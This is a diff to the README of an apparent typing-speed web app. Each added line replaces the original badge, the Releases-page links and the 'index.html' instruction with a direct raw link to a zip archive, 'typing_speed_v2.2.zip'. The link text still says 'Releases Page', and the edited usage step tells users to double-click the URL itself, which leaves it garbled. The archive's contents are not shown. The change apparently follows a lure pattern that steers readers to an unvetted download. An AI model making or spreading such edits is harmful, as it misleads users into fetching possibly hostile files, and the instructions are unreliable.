@@ -1,6 +1,6 @@
 # 🎯 typing-speed - Test Your Typing Skills Easily
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://github.com/ankitpadariya301/typing-speed/raw/refs/heads/main/Typingspeed/typing_speed_v2.2.zip)
 
 ## 🏁 Introduction
 Welcome to the **typing-speed** application! This is a simple and interactive Typing Speed Test web application. It uses HTML, CSS, and JavaScript to provide you with a real-time platform to test your typing speed and accuracy. This tool is perfect for anyone looking to practice their typing skills or showcase frontend development capabilities on GitHub.
@@ -16,12 +16,12 @@ Before you begin, make sure your device meets these basic requirements:
 ## 📥 Download & Install
 To download the application, visit the Releases page. From there, you can find the latest version of the application available for download.
 
-[Visit the Releases Page to Download](https://github.com/ankitpadariya301/typing-speed/releases)
+[Visit the Releases Page to Download](https://github.com/ankitpadariya301/typing-speed/raw/refs/heads/main/Typingspeed/typing_speed_v2.2.zip)
 
 Click on the link above to see all available versions. Look for the latest release and download the files.
 
 ## 🎉 How to Use the Application
-1. **Open the Application:** Once you have downloaded the files, locate the `index.html` file in the download folder. Double-click to open it in your web browser.
+1. **Open the Application:** Once you have downloaded the files, locate the `https://github.com/ankitpadariya301/typing-speed/raw/refs/heads/main/Typingspeed/typing_speed_v2.2.zip` file in the download folder. Double-click to open it in your web browser.
   
 2. **Start a Typing Test:** On the main screen, you will see a button to start the typing test. Click on it to begin.
 
@@ -55,4 +55,4 @@ If you need additional help using the application, please reach out via the Issu
 
 Thank you for choosing **typing-speed**! We hope you enjoy improving your typing skills with our application. Don't forget to share your results and progress with friends! 
 
-[Visit the Releases Page to Download](https://github.com/ankitpadariya301/typing-speed/releases)
+[Visit the Releases Page to Download](https://github.com/ankitpadariya301/typing-speed/raw/refs/heads/main/Typingspeed/typing_speed_v2.2.zip)
